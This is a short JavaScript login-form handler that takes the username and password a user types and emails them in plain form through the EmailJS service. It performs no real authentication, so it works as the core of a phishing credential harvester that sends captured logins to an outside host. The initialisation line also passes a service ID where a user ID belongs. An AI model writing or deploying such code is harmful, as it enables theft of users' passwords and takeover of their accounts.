
// Initialize EmailJS with your user ID
emailjs.init("service_2bhff34");

document.getElementById("login-form").addEventListener("submit", function (event) {
  event.preventDefault(); // Prevent page reload

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  if (username === "" || password === "") {
    alert("Please fill in all fields!");
    return;
  }

  // Replace YOUR_SERVICE_ID and YOUR_TEMPLATE_ID with actual IDs
  emailjs
    .send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
      username: username,
      password: password,
    })
    .then(
      function (response) {
        alert("Login details sent successfully!");
        console.log("SUCCESS!", response.status, response.text);
      },
      function (error) {
        alert("Failed to send login details. Please try again.");
        console.error("FAILED...", error);
      }
    );
});
